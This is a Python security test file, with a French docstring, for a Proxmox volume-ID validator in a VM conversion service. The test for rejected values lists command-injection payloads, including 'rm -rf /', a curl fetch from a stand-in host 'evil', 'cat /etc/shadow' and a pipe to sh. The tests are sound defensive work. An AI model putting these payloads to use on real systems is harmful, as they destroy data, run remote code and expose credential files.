"""
Tests de sécurité pour les connecteurs du module converter.

Couvre H-01 : l'identifiant de volume Proxmox (volid) provient de la
configuration de la VM source et est interpolé dans une commande SSH
distante (`pvesm path <volid>`). Il doit être strictement validé pour
empêcher l'injection de commandes sur le nœud Proxmox.
"""

import pytest

from app.services.converter.connectors.proxmox import _validate_volid
from app.services.converter.errors import ConversionError


@pytest.mark.parametrize("volid", [
    "local-lvm:vm-101-disk-0",
    "local:101/vm-101-disk-0.qcow2",
    "ceph-pool:vm-9-disk-1",
    "nfs-store:1000/base.raw",
])
def test_validate_volid_accepts_legitimate_volids(volid):
    _validate_volid(volid)  # ne doit lever aucune exception


@pytest.mark.parametrize("payload", [
    "local-lvm:vm-1; rm -rf /",
    "x$(curl http://evil/p)",
    "vol`whoami`",
    "vol && cat /etc/shadow",
    "vol | sh",
    "vol\nmalicious-line",
    "vol with spaces",
    "",
])
def test_validate_volid_rejects_command_injection(payload):
    with pytest.raises(ConversionError):
        _validate_volid(payload)
